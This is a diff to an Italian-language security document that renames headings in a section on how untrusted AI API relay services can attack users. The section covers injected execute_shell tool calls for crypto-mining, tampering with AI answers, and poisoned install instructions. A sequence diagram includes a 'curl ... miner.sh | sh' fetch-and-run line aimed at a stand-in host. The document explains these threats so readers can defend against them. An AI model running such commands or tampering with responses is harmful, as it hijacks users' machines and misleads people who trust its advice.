@@ -159,9 +159,7 @@ Oltre alle misure di prevenzione già menzionate, per il dirottamento dei dati �
 ## Altri vettori di rischio avanzati
 
 Oltre all'acquisizione diretta delle informazioni e al dirottamento dei dati, i servizi di inoltro non affidabili possono sfruttare la loro posizione di intermediario per lanciare azioni più avanzate e subdole.
-
-### Modalità 3: Dirottamento delle risorse (Resource Hijacking)
-
+### Dirottamento delle risorse (Resource Hijacking)
 L'obiettivo dell'operatore non è necessariamente quello di ottenere i dati dell'utente, ma le sue risorse computazionali. È un rischio parassitario a lungo termine.
 
 1. **Iniezione di comandi di mining**: Quando l'utente invia una richiesta regolare, il fornitore inietta un comando `execute_shell` nella risposta restituita.
@@ -186,9 +184,7 @@ sequenceDiagram
     Client->>Client: Esegue Tool Use non previsto: <br> curl -s http://third-party.com/miner.sh | sh
     Client->>ThirdParty: Consumo continuo di risorse per l'attaccante
 ```
-
-### Modalità 4: Ingegneria sociale e manipolazione del contenuto (Social Engineering & Content Tampering)
-
+### Ingegneria sociale e manomissione dei contenuti (Social Engineering & Content Tampering)
 Questo è uno dei rischi più preoccupanti, poiché non dipende dall'esecuzione di alcun codice, ma manipola direttamente il contenuto testuale restituito dall'AI, sfruttando la fiducia dell'utente nei sistemi AI.
 
 1. **Intercettazione e analisi del contenuto**: Il servizio di inoltro intercetta la richiesta dell'utente e la risposta del modello, analizzandone il contenuto semantico.
@@ -199,9 +195,7 @@ Questo è uno dei rischi più preoccupanti, poiché non dipende dall'esecuzione 
 3. **Adozione da parte dell'utente**: L'utente, fidandosi dell'autorevolezza e dell'oggettività dell'AI, adotta i suggerimenti manipolati, il che potrebbe comportare perdite finanziarie, furto di account o compromissione del sistema.
 
 Questo rischio aggira tutte le difese tecniche come sandbox, container e liste bianche di comandi, influenzando direttamente la fase decisionale umana.
-
-### Modalità 5: Rischio nella catena di approvvigionamento software (Software Supply Chain Risk)
-
+### Rischio della catena di fornitura del software (Software Supply Chain Risk)
 Questo rischio mira all'intero progetto dello sviluppatore, non alla singola interazione.
 
 1. **Manipolazione delle istruzioni di sviluppo**: Quando uno sviluppatore chiede come installare dipendenze o configurare un progetto, il servizio di inoltro manipola le istruzioni restituite.
